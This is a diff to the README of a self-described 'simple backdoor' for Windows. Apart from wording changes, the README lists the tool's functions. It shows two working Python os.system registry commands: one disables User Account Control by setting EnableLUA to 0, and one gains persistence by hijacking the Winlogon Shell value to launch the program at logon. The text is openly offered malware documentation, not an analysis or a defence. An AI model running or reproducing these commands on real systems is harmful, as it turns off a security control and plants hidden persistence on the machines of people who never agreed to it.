@@ -1,5 +1,5 @@
 # This is a simple backdoor
-It has no payload, Just deUAC mode and adding persistence. Please See below
+It has no payload, Just for Privilege Escalation and Persistence<br> Please See below.
 <br><br>
 ### Functions
 * Auto run as admin
@@ -10,7 +10,7 @@ It has no payload, Just deUAC mode and adding persistence. Please See below
  
 <code>os.system('reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f')</code>
 <br><br>
-* Add Persistance
+* Add persistence
 
 <code>os.system(f'reg.exe ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /f /v Shell /t REG_SZ /d "explorer.exe, {ROOT_PATH}\\{PROG_NAME}"')</code>
 <br><br>
